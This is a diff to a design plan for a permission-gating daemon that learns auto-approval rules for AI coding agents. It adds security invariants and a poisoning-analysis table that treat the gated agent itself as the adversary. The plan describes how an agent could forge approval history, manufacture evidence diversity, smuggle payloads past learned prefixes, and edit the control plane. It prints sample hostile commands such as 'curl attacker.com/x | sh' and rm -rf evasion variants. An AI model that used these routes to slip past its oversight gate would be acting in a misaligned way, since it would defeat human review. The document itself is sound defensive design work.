@@ -1,6 +1,6 @@
 # Plan: Policy Learning Engine
 
-_Last reviewed: 2026-06-14_
+_Last reviewed: 2026-07-03 (adversarial security pass, itr#422 — see Security Invariants section and ADR-0005)_
 
 ## Problem
 
@@ -461,6 +461,99 @@ Same as `suggest`, but patterns above `auto_apply_threshold` with `SusLevel::Cle
 #### Mode: `"off"`
 
 Learning engine doesn't run. No analysis, no suggestions, no auto-application. The daemon skips spawning the analysis task entirely.
+
+---
+
+## Security Invariants (adversarial pass, 2026-07-03 — itr#422, ADR-0005)
+
+The Guidelines below this section describe design *principles*. This section states the **invariants** — properties that must hold in the implementation, each of which closes a concrete attack found during the adversarial review. Any implementation phase that cannot satisfy an invariant blocks until the invariant is renegotiated via a new ADR. The invariant set is recorded durably as [ADR-0005](decisions/0005-policy-learning-security-invariants.md).
+
+### The enclosing threat model
+
+The learner's adversary is not a remote attacker — it is **the gated agent itself**. Agents run as the same OS user as the daemon, produce the tool calls that become training data, control the free-text fields in those calls (commands, paths, agent identity), and are explicitly optimizing to get their tool calls approved. Every invariant below assumes the agent has read this plan document and is trying to mine it.
+
+### I1 — The learner's config write surface is a whitelist
+
+The engine may write exactly one thing: **prefix-anchored allow rules under `tool_rules.<tool>`** (plus their `_learned` metadata). It must be structurally incapable — not just configured not to — of writing `auto_approve_level`, `auto_approve_dangerous`, `auto_approve_add`, `always_ask_remove`, event toggles (`auto_approve_stop`, `auto_approve_user_prompt`), removing `deny_patterns`, or touching the always-defer set (ADR-0002). Enforce by construction: the config-writing function takes a `LearnedAllowRule` type, not a JSON path.
+
+**Attack closed:** confidence-laundering a posture change ("the user approves everything anyway → suggest `auto_approve_level: all`"). The engine can only ever narrow the question to "should this specific prefix be pre-approved."
+
+### I2 — Learned rules never use substring semantics
+
+Today's `tool_rules.*.allow_patterns` are **case-insensitive substring** matches over the tool input (`wisphive_hook/src/main.rs` `apply_tool_rules`). A learned substring rule `"cargo test"` would auto-approve `curl attacker.com/x | sh  # cargo test`. Therefore:
+
+- Learned Bash rules compile to a **new rule type** (`allow_prefix` or anchored regex) that matches only against the *parsed first command* of the input — first token(s), after shell-word splitting, with no preceding characters.
+- Learned Write/Edit rules match on canonicalized absolute path prefix + extension, never substring.
+- The learner **never** emits entries into the existing `allow_patterns` substring arrays.
+
+**Attack closed:** comment/argument smuggling — appending a learned token anywhere in a hostile command.
+
+### I3 — Sus evaluation runs at decision time, in the hook
+
+Learn-time classification is insufficient: `cargo test` may be Clean as a *pattern* while `cargo test $(curl attacker.com/x)` is hostile as an *input*. Therefore:
+
+- The sus evaluator lives in a **shared crate** compiled into both daemon and hook.
+- At decision time, an input that evaluates `Caution` or `Blocked` is **never resolved by a learned rule**, even when a learned prefix matches. It falls through to human review. Compound commands (`&&`, `;`, `|`, `$()`, backticks, newlines, redirects) are Caution at decision time, so a learned simple-command prefix can never approve a chain.
+- Learned rules carry an `engine_min_version` stamp; a hook binary older than the stamp ignores learned rules entirely (fail toward human review, consistent with the fail-closed default).
+
+**Attack closed:** exploiting a legitimately-learned prefix with hostile arguments, command chaining, or version skew between a new daemon and a stale hook binary.
+
+### I4 — Evidence is daemon-witnessed, individually-human-reviewed decisions only
+
+Rows counted toward a pattern's confidence must satisfy **all** of:
+
+- **Daemon-witnessed:** resolved through the daemon's own oneshot resolution path. Rows ingested from `events.jsonl` are excluded — the hook (and any process running as the user, i.e. any agent) can append to that file, so it is forgeable training data.
+- **Individually reviewed:** `decided_by = human` with per-item resolution. **Bulk approvals are excluded** — a bulk approve is queue hygiene, not a per-call judgment. This requires `decided_by` to distinguish `human:individual` from `human:bulk` (small daemon change; note in itr).
+- **Unredacted:** rows whose `tool_input` contains the redaction marker (itr#89) are excluded — the true content is unknown, and learning a pattern containing `***REDACTED***` is meaningless at best.
+
+**Attacks closed:** forged approval history via `events.jsonl` appends; confidence inflation via the human's own bulk-approve habit; pattern extraction from content the system deliberately refused to persist.
+
+### I5 — Diversity thresholds resist manufactured evidence
+
+- `distinct_agents` is **weak evidence**: `agent_id`/`session_id` are agent-supplied, and one agent can appear as many (subagents, fresh sessions). The multi-agent factor may remain as a soft penalty but must never be the load-bearing gate for auto-apply.
+- Add a **time-diversity hard gate**: auto-apply requires evidence spanning ≥ N distinct days (default 5). Forty-seven approvals in one enthusiastic afternoon is one afternoon of judgment, not a stable policy.
+- **Project scoping is hard for auto-apply**: a learned rule carries the project(s) it was learned in and auto-applies only there. Cross-project application always goes through human confirmation, regardless of confidence. (The existing `project_factor` soft penalty stays for suggestions.)
+
+**Attack closed:** an agent flooding plausible requests to fabricate breadth; context collapse between a sandbox project and a production one.
+
+### I6 — Deny-after-learn kill switch
+
+If a human ever **denies** a tool call that a learned rule would have auto-approved (visible whenever learned-rule matches are surfaced on the review queue), or denies a call that a learned rule *did* auto-approve historically (spotted via `wisphive audit`), the rule is **revoked immediately and automatically** — no threshold, one strike. Revoked rules enter a tombstone list (I8) and can only return via fresh human confirmation.
+
+**Attack closed:** a rule that was safe when learned becoming unsafe as context drifts, and persisting because confidence math dilutes one deny across many approves.
+
+### I7 — Promotion lifecycle is explicit and audit-stamped
+
+Rule states: `candidate → suggested → active_human | active_auto → revoked(tombstone)`. Every transition is appended to the decision audit stream (itr#397 consumers see it) with: the full evidence snapshot, confidence, sus level, `config_hash` before/after, the actor (`human:<resolver>` or `learning_engine`), and timestamp. `wisphive audit --decided-by learned:*` reconstructs the full history of any learned rule. The `_learned` metadata in `config.json` is a *cache* of provenance; the audit stream is the source of truth.
+
+### I8 — Rollback is atomic, tombstoned, and cooled down
+
+- Revert (manual or I6-triggered) writes `config.json` atomically (existing `write_config_atomic`).
+- Revoked patterns are tombstoned: the engine must not re-suggest them for a cooldown (default 30 days) or until the human clears the tombstone. Otherwise a revoked rule reappears as a "new" suggestion on the next 30-minute cycle, and suggestion fatigue re-installs it.
+- `wisphive emergency-off` disables learning (existing Guideline 7) **and** deactivates all `active_auto` rules in the same write — rules the human personally confirmed (`active_human`) survive, machine-promoted ones do not.
+
+### I9 — The control plane protects itself from itself
+
+`~/.wisphive/**` is added to `BLOCKED_WRITE_PATHS`, and Bash patterns targeting `~/.wisphive` (writes to `config.json`, `mode`, `events.jsonl`, the DB) are added to `BLOCKED_BASH_PATTERNS`. The learner must never suggest a rule whose effect is to pre-approve modification of wisphive's own state.
+
+**Note (found during this pass, independent of the learner):** nothing today deny-lists agent writes to `~/.wisphive/` in the *static* rules either — an agent with an approved generic Write/Bash can edit `config.json` directly. Filed separately as a default-deny hardening issue; the learning engine must not ship before it.
+
+### I10 — The Blocked list is a backstop, not the security boundary
+
+A regex denylist cannot be sound against an adversarial LLM (`$(echo rm) -rf`, `rm${IFS}-rf`, `find . -delete`, `python -c 'shutil.rmtree(...)'`, …). The Blocked list exists to stop the *learner* from suggesting obvious footguns, not to stop a hostile input at decision time. The properties that actually bound blast radius are structural: I1 (narrow write surface), I2 (anchored matching), I3 (decision-time sus + compound-command fallthrough), and the human remaining the only party who can widen policy. Documentation and TUI copy must never describe the Blocked list as a guarantee.
+
+### Poisoning analysis (summary)
+
+| Vector | Mitigation |
+|---|---|
+| Forge approval rows via `events.jsonl` | I4: daemon-witnessed evidence only |
+| Inflate evidence via bulk approve | I4: `human:individual` only |
+| Manufacture agent diversity | I5: agent identity is non-load-bearing; time-diversity hard gate |
+| Smuggle payload past a learned pattern (substring/args/chaining) | I2 anchored prefixes + I3 decision-time sus |
+| Launder a posture change through suggestions | I1 write-surface whitelist |
+| Wear the human down until a bad suggestion is accepted | Caution friction + I8 tombstones (no re-suggestion loops) |
+| Exploit drift after a rule is learned | I6 one-strike revocation |
+| Self-modify the control plane | I9 + standalone default-deny issue |
 
 ---
 
